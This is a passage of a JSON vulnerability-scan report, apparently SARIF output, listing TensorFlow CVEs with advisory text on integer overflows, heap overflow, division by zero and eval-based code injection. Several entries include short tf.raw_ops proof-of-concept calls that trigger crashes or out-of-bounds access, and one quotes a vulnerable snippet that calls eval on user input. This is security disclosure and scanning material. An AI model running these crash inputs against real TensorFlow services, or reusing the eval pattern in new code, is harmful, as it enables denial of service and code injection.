              "help": {
                "text": "Vulnerability CVE-2021-41197\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41197](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41197)\n### Impact\nTensorFlow allows tensor to have a large number of dimensions and each dimension can be as large as desired. However, the total number of elements in a tensor must fit within an `int64_t`. If an overflow occurs, `MultiplyWithoutOverflow` would return a negative result. In the majority of TensorFlow codebase this then results in a `CHECK`-failure. Newer constructs exist which return a `Status` instead of crashing the binary.\n\nFor example [`AddDim`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L395-L408) calls should be replaced by [`AddDimWithStatus`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L410-L440).\n\nThis is similar to [CVE-2021-29584](https://github.com/tensorflow/tensorflow/blob/3a74f0307236fe206b046689c4d76f57c9b74eee/tensorflow/security/advisory/tfsa-2021-071.md) (and similar other reported vulnerabilities in TensorFlow, localized to specific APIs).\n\n### Patches\nWe have patched the issue in GitHub commits [7c1692bd417eb4f9b33ead749a41166d6080af85](https://github.com/tensorflow/tensorflow/commit/7c1692bd417eb4f9b33ead749a41166d6080af85) (merging [#51732](https://github.com/tensorflow/tensorflow/pull/51732)), [d81b1351da3e8c884ff836b64458d94e4a157c15](https://github.com/tensorflow/tensorflow/commit/d81b1351da3e8c884ff836b64458d94e4a157c15) (merging [#51717](https://github.com/tensorflow/tensorflow/pull/51717)), [a871989d7b6c18cdebf2fb4f0e5c5b62fbc19edf](https://github.com/tensorflow/tensorflow/commit/a871989d7b6c18cdebf2fb4f0e5c5b62fbc19edf) (merging [#51658](https://github.com/tensorflow/tensorflow/pull/51658)), and [d81b1351da3e8c884ff836b64458d94e4a157c15](https://github.com/tensorflow/tensorflow/commit/d81b1351da3e8c884ff836b64458d94e4a157c15) (merging [#51973](https://github.com/tensorflow/tensorflow/pull/51973)). It is possible that other similar instances exist in TensorFlow, we will issue fixes as these are discovered.\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46890), [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51618) and [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51908).",
                "markdown": "**Vulnerability CVE-2021-41197**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41197](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41197)|\n\n### Impact\nTensorFlow allows tensor to have a large number of dimensions and each dimension can be as large as desired. However, the total number of elements in a tensor must fit within an `int64_t`. If an overflow occurs, `MultiplyWithoutOverflow` would return a negative result. In the majority of TensorFlow codebase this then results in a `CHECK`-failure. Newer constructs exist which return a `Status` instead of crashing the binary.\n\nFor example [`AddDim`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L395-L408) calls should be replaced by [`AddDimWithStatus`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L410-L440).\n\nThis is similar to [CVE-2021-29584](https://github.com/tensorflow/tensorflow/blob/3a74f0307236fe206b046689c4d76f57c9b74eee/tensorflow/security/advisory/tfsa-2021-071.md) (and similar other reported vulnerabilities in TensorFlow, localized to specific APIs).\n\n### Patches\nWe have patched the issue in GitHub commits [7c1692bd417eb4f9b33ead749a41166d6080af85](https://github.com/tensorflow/tensorflow/commit/7c1692bd417eb4f9b33ead749a41166d6080af85) (merging [#51732](https://github.com/tensorflow/tensorflow/pull/51732)), [d81b1351da3e8c884ff836b64458d94e4a157c15](https://github.com/tensorflow/tensorflow/commit/d81b1351da3e8c884ff836b64458d94e4a157c15) (merging [#51717](https://github.com/tensorflow/tensorflow/pull/51717)), [a871989d7b6c18cdebf2fb4f0e5c5b62fbc19edf](https://github.com/tensorflow/tensorflow/commit/a871989d7b6c18cdebf2fb4f0e5c5b62fbc19edf) (merging [#51658](https://github.com/tensorflow/tensorflow/pull/51658)), and [d81b1351da3e8c884ff836b64458d94e4a157c15](https://github.com/tensorflow/tensorflow/commit/d81b1351da3e8c884ff836b64458d94e4a157c15) (merging [#51973](https://github.com/tensorflow/tensorflow/pull/51973)). It is possible that other similar instances exist in TensorFlow, we will issue fixes as these are discovered.\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46890), [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51618) and [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51908)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41228",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41228"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41228",
              "help": {
                "text": "Vulnerability CVE-2021-41228\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41228)\n### Impact\nTensorFlow`s `saved_model_cli` tool is vulnerable to a code injection as it [calls `eval` on user supplied strings](https://github.com/tensorflow/tensorflow/blob/87462bfac761435a46641ff2f10ad0b6e5414a4b/tensorflow/python/tools/saved_model_cli.py#L524-L550)\n  \n```python\ndef preprocess_input_exprs_arg_string(input_exprs_str):\n  ... \n  for input_raw in filter(bool, input_exprs_str.split(`;`)):\n    ...\n    input_key, expr = input_raw.split(`=`, 1)\n    input_dict[input_key] = eval(expr)\n  ...\n``` \n  \nThis can be used by attackers to run arbitrary code on the plaform where the CLI tool runs.\nHowever, given that the tool is always run manually, the impact of this is not severe. We have patched this by adding a `safe` flag which defaults to `True` and an explicit warning for users. \n\n### Patches\nWe have patched the issue in GitHub commit [8b202f08d52e8206af2bdb2112a62fafbc546ec7](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Omer Kaspi from Vdoo.",
                "markdown": "**Vulnerability CVE-2021-41228**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41228)|\n\n### Impact\nTensorFlow`s `saved_model_cli` tool is vulnerable to a code injection as it [calls `eval` on user supplied strings](https://github.com/tensorflow/tensorflow/blob/87462bfac761435a46641ff2f10ad0b6e5414a4b/tensorflow/python/tools/saved_model_cli.py#L524-L550)\n  \n```python\ndef preprocess_input_exprs_arg_string(input_exprs_str):\n  ... \n  for input_raw in filter(bool, input_exprs_str.split(`;`)):\n    ...\n    input_key, expr = input_raw.split(`=`, 1)\n    input_dict[input_key] = eval(expr)\n  ...\n``` \n  \nThis can be used by attackers to run arbitrary code on the plaform where the CLI tool runs.\nHowever, given that the tool is always run manually, the impact of this is not severe. We have patched this by adding a `safe` flag which defaults to `True` and an explicit warning for users. \n\n### Patches\nWe have patched the issue in GitHub commit [8b202f08d52e8206af2bdb2112a62fafbc546ec7](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Omer Kaspi from Vdoo."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41209",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41209"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41209",
              "help": {
                "text": "Vulnerability CVE-2021-41209\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41209)\n### Impact\nThe [implementations for convolution operators](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/conv_ops.cc) trigger a division by 0 if passed empty filter tensor arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [f2c3931113eaafe9ef558faaddd48e00a6606235](https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235).\n  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41209**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41209)|\n\n### Impact\nThe [implementations for convolution operators](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/conv_ops.cc) trigger a division by 0 if passed empty filter tensor arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [f2c3931113eaafe9ef558faaddd48e00a6606235](https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235).\n  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41219",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41219"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41219",
              "help": {
                "text": "Vulnerability CVE-2021-41219\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41219)\n### Impact\nThe [code for sparse matrix multiplication](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/sparse_matmul_op.cc#L954-L1086) is vulnerable to undefined behavior via binding a reference to `nullptr`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SparseMatMul(\n  a=[[1.0,1.0,1.0]],\n  b=[[],[],[]],\n  transpose_a=False,\n  transpose_b=False,\n  a_is_sparse=False, \n  b_is_sparse=True)\n```\n\nThis occurs whenever the dimensions of `a` or `b` are 0 or less. In the case on one of these is 0, an empty output tensor should be allocated (to conserve the invariant that output tensors are always allocated when the operation is successful) but nothing should be written to it (that is, we should return early from the kernel implementation). Otherwise, attempts to write to this empty tensor would result in heap OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [e6cf28c72ba2eb949ca950d834dd6d66bb01cfae](https://github.com/tensorflow/tensorflow/commit/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.\n",
                "markdown": "**Vulnerability CVE-2021-41219**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41219)|\n\n### Impact\nThe [code for sparse matrix multiplication](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/sparse_matmul_op.cc#L954-L1086) is vulnerable to undefined behavior via binding a reference to `nullptr`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SparseMatMul(\n  a=[[1.0,1.0,1.0]],\n  b=[[],[],[]],\n  transpose_a=False,\n  transpose_b=False,\n  a_is_sparse=False, \n  b_is_sparse=True)\n```\n\nThis occurs whenever the dimensions of `a` or `b` are 0 or less. In the case on one of these is 0, an empty output tensor should be allocated (to conserve the invariant that output tensors are always allocated when the operation is successful) but nothing should be written to it (that is, we should return early from the kernel implementation). Otherwise, attempts to write to this empty tensor would result in heap OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [e6cf28c72ba2eb949ca950d834dd6d66bb01cfae](https://github.com/tensorflow/tensorflow/commit/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.\n"
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23568",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23568"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23568",
              "help": {
                "text": "Vulnerability CVE-2022-23568\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23568](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23568)\n### Impact \nThe [implementation of `AddManySparseToTensorsMap`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_tensors_map_ops.cc) is vulnerable to an integer overflow which results in a `CHECK`-fail when building new `TensorShape` objects (so, an assert failure based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],\n    sparse_values=[1,1,1,1,1,1],\n    sparse_shape=[2**32,2**32],\n    container=``,\n    shared_name=``,\n    name=None)\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n### Patches\nWe have patched the issue in GitHub commits [b51b82fe65ebace4475e3c54eb089c18a4403f1c](https://github.com/tensorflow/tensorflow/commit/b51b82fe65ebace4475e3c54eb089c18a4403f1c) and [a68f68061e263a88321c104a6c911fe5598050a8](https://github.com/tensorflow/tensorflow/commit/a68f68061e263a88321c104a6c911fe5598050a8).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-23568**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23568](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23568)|\n\n### Impact \nThe [implementation of `AddManySparseToTensorsMap`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_tensors_map_ops.cc) is vulnerable to an integer overflow which results in a `CHECK`-fail when building new `TensorShape` objects (so, an assert failure based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],\n    sparse_values=[1,1,1,1,1,1],\n    sparse_shape=[2**32,2**32],\n    container=``,\n    shared_name=``,\n    name=None)\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n### Patches\nWe have patched the issue in GitHub commits [b51b82fe65ebace4475e3c54eb089c18a4403f1c](https://github.com/tensorflow/tensorflow/commit/b51b82fe65ebace4475e3c54eb089c18a4403f1c) and [a68f68061e263a88321c104a6c911fe5598050a8](https://github.com/tensorflow/tensorflow/commit/a68f68061e263a88321c104a6c911fe5598050a8).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23562",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23562"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23562",
              "help": {
                "text": "Vulnerability CVE-2022-23562\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23562)\n### Impact\nThe implementation of `Range` suffers from integer overflows. These can trigger undefined behavior or, in some scenarios, extremely large allocations.\n\n### Patches\nWe have patched the issue in GitHub commit [f0147751fd5d2ff23251149ebad9af9f03010732](https://github.com/tensorflow/tensorflow/commit/f0147751fd5d2ff23251149ebad9af9f03010732) (merging [#51733](https://github.com/tensorflow/tensorflow/pull/51733)).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/52676).",
                "markdown": "**Vulnerability CVE-2022-23562**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23562)|\n\n### Impact\nThe implementation of `Range` suffers from integer overflows. These can trigger undefined behavior or, in some scenarios, extremely large allocations.\n\n### Patches\nWe have patched the issue in GitHub commit [f0147751fd5d2ff23251149ebad9af9f03010732](https://github.com/tensorflow/tensorflow/commit/f0147751fd5d2ff23251149ebad9af9f03010732) (merging [#51733](https://github.com/tensorflow/tensorflow/pull/51733)).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/52676)."
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23559",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23559"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23559",
              "help": {
                "text": "Vulnerability CVE-2022-23559\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23559)\n### Impact \nAn attacker can craft a TFLite model that would cause an integer overflow [in embedding lookup operations](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/kernels/embedding_lookup_sparse.cc#L179-L189):\n\n```cc\n  int embedding_size = 1;\n  int lookup_size = 1;\n  for (int i = 0; i \u003c lookup_rank - 1; i++, k++) {\n    const int dim = dense_shape-\u003edata.i32[i];\n    lookup_size *= dim;\n    output_shape-\u003edata[k] = dim;\n  }\n  for (int i = 1; i \u003c embedding_rank; i++, k++) {\n    const int dim = SizeOfDimension(value, i);\n    embedding_size *= dim;\n    output_shape-\u003edata[k] = dim;\n  } \n```\n\nBoth `embedding_size` and `lookup_size` are products of values provided by the user. Hence, a malicious user could trigger overflows in the multiplication.\n\nIn certain scenarios, this can then result in heap OOB read/write.\n  \n### Patches\nWe have patched the issue in GitHub commits [f19be71717c497723ba0cea0379e84f061a75e01](https://github.com/tensorflow/tensorflow/commit/f19be71717c497723ba0cea0379e84f061a75e01), [1de49725a5fc4e48f1a3b902ec3599ee99283043](https://github.com/tensorflow/tensorflow/commit/1de49725a5fc4e48f1a3b902ec3599ee99283043) and [a4e401da71458d253b05e41f28637b65baf64be4](https://github.com/tensorflow/tensorflow/commit/a4e401da71458d253b05e41f28637b65baf64be4).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team. ",
                "markdown": "**Vulnerability CVE-2022-23559**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23559)|\n\n### Impact \nAn attacker can craft a TFLite model that would cause an integer overflow [in embedding lookup operations](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/kernels/embedding_lookup_sparse.cc#L179-L189):\n\n```cc\n  int embedding_size = 1;\n  int lookup_size = 1;\n  for (int i = 0; i \u003c lookup_rank - 1; i++, k++) {\n    const int dim = dense_shape-\u003edata.i32[i];\n    lookup_size *= dim;\n    output_shape-\u003edata[k] = dim;\n  }\n  for (int i = 1; i \u003c embedding_rank; i++, k++) {\n    const int dim = SizeOfDimension(value, i);\n    embedding_size *= dim;\n    output_shape-\u003edata[k] = dim;\n  } \n```\n\nBoth `embedding_size` and `lookup_size` are products of values provided by the user. Hence, a malicious user could trigger overflows in the multiplication.\n\nIn certain scenarios, this can then result in heap OOB read/write.\n  \n### Patches\nWe have patched the issue in GitHub commits [f19be71717c497723ba0cea0379e84f061a75e01](https://github.com/tensorflow/tensorflow/commit/f19be71717c497723ba0cea0379e84f061a75e01), [1de49725a5fc4e48f1a3b902ec3599ee99283043](https://github.com/tensorflow/tensorflow/commit/1de49725a5fc4e48f1a3b902ec3599ee99283043) and [a4e401da71458d253b05e41f28637b65baf64be4](https://github.com/tensorflow/tensorflow/commit/a4e401da71458d253b05e41f28637b65baf64be4).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team. "
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21740",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21740"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21740",
              "help": {
                "text": "Vulnerability CVE-2022-21740\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21740](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21740)\n### Impact \nThe [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) is vulnerable to a heap overflow:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[-1,-1]],\n  values=[2],\n  dense_shape=[1, 1],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-21740**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21740](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21740)|\n\n### Impact \nThe [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) is vulnerable to a heap overflow:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[-1,-1]],\n  values=[2],\n  dense_shape=[1, 1],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
